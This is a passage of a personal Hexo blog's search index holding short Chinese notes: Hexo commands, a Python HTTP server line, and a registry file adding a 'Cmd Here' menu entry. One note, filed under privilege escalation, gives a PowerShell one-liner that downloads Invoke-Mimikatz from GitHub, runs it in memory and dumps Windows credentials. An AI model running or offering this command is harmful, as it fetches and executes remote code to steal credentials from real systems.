    <content type="text"><![CDATA[python -m SimpleHTTPServer 8080 #端口可自定义]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>command</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win10-Cmd here]]></title>
    <url>%2F2017%2F03%2F04%2Fwin10-Cmd-here%2F</url>
    <content type="text"><![CDATA[保存为reg格式导入注册表即可： Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot; \&quot;cd %1\&quot;&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>cmd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo command]]></title>
    <url>%2F2017%2F03%2F02%2Fhexo-command%2F</url>
    <content type="text"><![CDATA[hexo new &quot;postName&quot; #新建文章 hexo new page &quot;pageName&quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） hexo deploy #将.deploy目录部署到GitHub hexo clean hexo generate --deploy]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mimikittenz-Ps1版]]></title>
    <url>%2F2017%2F03%2F01%2Fmimikittenz-Ps1%E7%89%88%2F</url>
    <content type="text"><![CDATA[powershell “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1‘); Invoke-Mimikatz -DumpCreds”]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>mimikittenz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0o0-test]]></title>
    <url>%2F2017%2F03%2F01%2F0o0-test%2F</url>
    <content type="text"><![CDATA[测试文章–test—0o0~！！！！！！ hexo new “postName” #新建文章hexo new page “pageName” #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）hexo deploy #将.deploy目录部署到GitHub hexo new [layout] hexo new photo “My Gallery”hexo new “Hello World” –lang tw title: 使用Hexo搭建个人博客layout: postdate: 2014-03-03 19:07:43comments: truecategories: Blogtags: [Hexo]keywords: Hexo, Blogdescription: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftags%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Fcategories%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[0o0]]></title>
    <url>%2Fabout%2Findex.html</url>
    <content type="text"><![CDATA[&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;######！######!&lt;&lt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&lt;&gt;&gt;&gt;&gt;&gt;]]></content>
  </entry>
</search>
